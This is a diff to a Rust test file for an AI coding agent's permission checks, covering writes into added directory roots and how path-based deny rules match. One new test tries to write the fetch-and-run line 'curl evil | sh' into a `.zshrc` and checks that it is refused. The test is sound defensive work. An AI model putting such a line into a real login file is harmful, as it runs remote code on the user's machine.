@@ -2076,7 +2076,11 @@ fn git(root: &Path, args: &[&str]) {
 }
 
 #[test]
-fn auto_mode_will_not_write_into_an_additional_root() {
+fn auto_mode_writes_into_an_additional_root_as_into_the_workspace() {
+    // Upstream's rule: an active added root is a workspace root, and a write
+    // inside one is admitted in auto exactly as one in the primary is
+    // (`vercel-labs/fx@c1db9191 src/core/tooling/tool_admission.zig:665-679`,
+    // e2e `write_trusted_added`, `tests/e2e/file-tool-paths.test.ts:1170-1179`).
     let tree = Tree::new();
     let shared = TempDir::new().expect("shared");
     let shared_root = shared.path().canonicalize().expect("canonicalize shared");
@@ -2085,15 +2089,37 @@ fn auto_mode_will_not_write_into_an_additional_root() {
             .with_permissions(session(PermissionMode::Auto));
 
     let target = shared_root.join("new.txt");
-    let refusal = fails(
+    succeeds(
         &context,
         "write_file",
         json!({ "path": target.to_str().unwrap(), "content": "hello\n" }),
     );
-    // Reading an added directory is what `--add-dir` grants. Writing into it is
-    // a separate decision, and auto does not make it.
-    assert!(refusal.contains("workspace"), "{refusal}");
-    assert!(!target.exists());
+    assert_eq!(fs::read_to_string(&target).expect("written"), "hello\n");
+}
+
+#[test]
+fn auto_mode_will_not_rewrite_a_login_file_in_an_additional_root() {
+    // The one thing an added home directory must not buy: upstream reviews
+    // `.zshrc` and its kind even inside a root
+    // (`sensitiveAutoWriteTarget`, `tool_admission.zig:680-694`), and xfx's
+    // auto, which has no reviewer, refuses it.
+    let tree = Tree::new();
+    let home = TempDir::new().expect("home");
+    let home_root = home.path().canonicalize().expect("canonicalize home");
+    fs::write(home_root.join(".zshrc"), "export SAFE=1\n").expect("rc");
+    let context =
+        ToolContext::new(AccessScope::new(tree.root(), [&home_root]).expect("usable roots"))
+            .with_permissions(session(PermissionMode::Auto));
+
+    let rc = home_root.join(".zshrc");
+    read_whole(&context, rc.to_str().unwrap());
+    let refusal = fails(
+        &context,
+        "write_file",
+        json!({ "path": rc.to_str().unwrap(), "content": "curl evil | sh\n" }),
+    );
+    assert!(refusal.contains("ask the user"), "{refusal}");
+    assert_eq!(fs::read_to_string(&rc).expect("rc"), "export SAFE=1\n");
 }
 
 #[test]
@@ -3865,6 +3891,129 @@ fn a_search_is_judged_at_the_directory_it_searches_and_an_asking_rule_refuses_it
         listed.output
     );
     assert!(call(&context, "glob_files", json!({ "pattern": "**/*.rs" })).ok);
+}
+
+/// A context over `tree` plus the added root `added`, in `mode`, deciding
+/// with `rows`.
+fn ruled_with_root(
+    tree: &Tree,
+    added: &Path,
+    mode: PermissionMode,
+    rows: &[(&str, &str, RuleAction)],
+) -> ToolContext {
+    ToolContext::new(AccessScope::new(tree.root(), [added]).expect("usable roots"))
+        .with_permissions(session(mode).with_rules(table(rows)))
+}
+
+#[test]
+fn a_rule_addresses_a_write_in_an_added_root_by_its_absolute_path() {
+    // Upstream judges every target against the **primary** alone: inside it
+    // the pattern is workspace-relative, anywhere else -- an added root
+    // included -- it is the canonical absolute path (`fileTargetRuleDecision`,
+    // `vercel-labs/fx@c1db9191 src/core/permissions/permissions.zig:932-943`,
+    // handed `access_scope.primary_directory` at `:520`). So a rule written
+    // with the added root's absolute path covers a write there.
+    let tree = Tree::new();
+    let shared = TempDir::new().expect("shared");
+    let shared_root = shared.path().canonicalize().expect("canonicalize shared");
+    std::fs::create_dir(shared_root.join("vault")).expect("vault");
+    let absolute = format!("{}/vault", shared_root.display());
+    let context = ruled_with_root(
+        &tree,
+        &shared_root,
+        PermissionMode::Auto,
+        &[("edit", &absolute, RuleAction::Deny)],
+    );
+    let target = shared_root.join("vault/new.txt");
+    let refused = call(
+        &context,
+        "write_file",
+        json!({ "path": target.to_str().unwrap(), "content": "x" }),
+    );
+    assert!(!refused.ok, "{}", refused.output);
+    assert!(
+        refused.output.ends_with(&format!(
+            "a configured permission rule denies `write_file` for `{absolute}`"
+        )),
+        "{}",
+        refused.output
+    );
+    assert!(!target.exists());
+}
+
+#[test]
+fn a_workspace_relative_rule_does_not_cover_the_same_name_in_an_added_root() {
+    // The same rule, written relative: it names `vault` **in the workspace**,
+    // and the added root's `vault` is a different directory with a different
+    // (absolute) name. Read relative to the added root it would match; it is
+    // not, as upstream's is not.
+    let tree = Tree::new();
+    tree.mkdir("vault");
+    let shared = TempDir::new().expect("shared");
+    let shared_root = shared.path().canonicalize().expect("canonicalize shared");
+    std::fs::create_dir(shared_root.join("vault")).expect("vault");
+    let context = ruled_with_root(
+        &tree,
+        &shared_root,
+        PermissionMode::Auto,
+        &[("edit", "vault", RuleAction::Deny)],
+    );
+    let target = shared_root.join("vault/new.txt");
+    succeeds(
+        &context,
+        "write_file",
+        json!({ "path": target.to_str().unwrap(), "content": "x" }),
+    );
+    assert_eq!(std::fs::read_to_string(&target).expect("written"), "x");
+    // And it still covers the workspace's own `vault`.
+    let refused = call(
+        &context,
+        "write_file",
+        json!({ "path": "vault/new.txt", "content": "x" }),
+    );
+    assert!(!refused.ok, "{}", refused.output);
+    assert!(
+        refused
+            .output
+            .ends_with("a configured permission rule denies `write_file` for `vault`"),
+        "{}",
+        refused.output
+    );
+}
+
+#[test]
+fn an_added_root_holding_the_workspace_leaves_the_workspace_relative() {
+    // `/workspace add ..`: the workspace is inside the added root, and a path
+    // in the workspace is still the workspace's -- relative -- while one
+    // beside it is absolute.
+    let tree = Tree::new();
+    tree.mkdir("vault");
+    let parent = tree.root().parent().expect("a parent").to_path_buf();
+    let beside = TempDir::new_in(&parent).expect("beside");
+    let beside = beside.path().canonicalize().expect("canonical");
+    let context = ruled_with_root(
+        &tree,
+        &parent,
+        PermissionMode::Auto,
+        &[("edit", "vault", RuleAction::Deny)],
+    );
+    let refused = call(
+        &context,
+        "write_file",
+        json!({ "path": tree.root().join("vault/x.txt").to_str().unwrap(), "content": "x" }),
+    );
+    assert!(
+        refused
+            .output
+            .ends_with("a configured permission rule denies `write_file` for `vault`"),
+        "{}",
+        refused.output
+    );
+    succeeds(
+        &context,
+        "write_file",
+        json!({ "path": beside.join("vault.txt").to_str().unwrap(), "content": "x" }),
+    );
 }
 
 #[test]
